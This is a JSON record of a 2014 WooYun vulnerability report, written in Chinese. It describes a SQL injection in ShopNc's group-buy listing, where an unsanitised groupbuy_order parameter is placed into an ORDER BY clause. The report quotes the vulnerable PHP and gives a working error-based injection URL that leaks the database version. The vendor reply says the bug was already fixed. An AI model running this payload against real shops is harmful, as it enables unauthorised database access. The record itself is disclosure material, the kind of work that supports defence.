{"id": 56996, "wybug_id": "wooyun-2014-055614", "wybug_title": "ShopNc SQL注入漏洞", "wybug_corp": "shopnc.net", "wybug_author": "Matt", "wybug_date": "2014-04-06 14:14", "wybug_open_date": "2014-07-02 14:15", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-04-08：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-06-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-06-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-02：\t细节向公众公开  简要描述： ShopNc注入漏洞 详细说明：  \n/control/show_groupby.phppublic function groupbuy_listOp() {\t\t$g_cache = ($cache = F('groupbuy'))? $cache : H('groupbuy',true,'file');        //获取当前进行中的团购活动        $template_in_progress = $this->get_groupbuy_template_list('in_progress');        Tpl::output('groupbuy_template',$template_in_progress[0]);        //输出倒计时        $this->output_count_down($template_in_progress[0]['end_time']);        //分页        $page = new Page();        $page->setEachNum(9) ;        $page->setStyle('admin') ;        //获取正在进行中的团购列表        $param = array();        $param['area_id'] = intval($_GET['groupbuy_area']);        if(empty($param['area_id'])) {            if(cookie('groupbuy_area')) {                $area_array = explode(',',cookie('groupbuy_area'));                $param['area_id'] = intval($area_array[0]);            }        }        $param['class_id'] = intval($_GET['groupbuy_class']);        if(intval($_GET['groupbuy_price']) !== 0) {            $price_range_list = $g_cache['price'];            foreach($price_range_list as $price_range) {                if($price_range['range_id'] == $_GET['groupbuy_price']) {                    $param['greater_than_groupbuy_price'] = $price_range['range_end'];                    $param['less_than_groupbuy_price'] = $price_range['range_start'];                }             }        }        $groupbuy_order_key = trim($_GET['groupbuy_order_key']);        $groupbuy_order = empty($_GET['groupbuy_order'])?'desc':trim($_GET['groupbuy_order']);//获取参数        if(!empty($groupbuy_order_key)) {            switch ($groupbuy_order_key) {                case 'price':                    $param['order'] = 'state asc,groupbuy_price '.$groupbuy_order;//带入ORDER 语句                    break;                case 'rebate':                    $param['order'] = 'state asc,rebate '.$groupbuy_order;                    break;                case 'sale':                    $param['order'] = 'state asc,buyer_count '.$groupbuy_order;\n   漏洞证明：  \n测试方法http://127.0.0.1/shopnc/index.php?act=show_groupbuy&op=groupbuy_list&id=1&groupbuy_order_key=price&groupbuy_order=%20%20and%20%28select%201%20from%20%20%28select%20count%28*%29,concat%28version%28%29,floor%28rand%280%29*2%29%29x%20from%20%20information_schema.tables%20group%20by%20x%29a%29%20--\n\n\n   修复方案：  你猜   版权声明：转载请注明来源 Matt@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-07-02 14:15 厂商回复： 谢谢Matt，这个漏洞在去年已经修复过了，建议从官网下载最新版测试 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}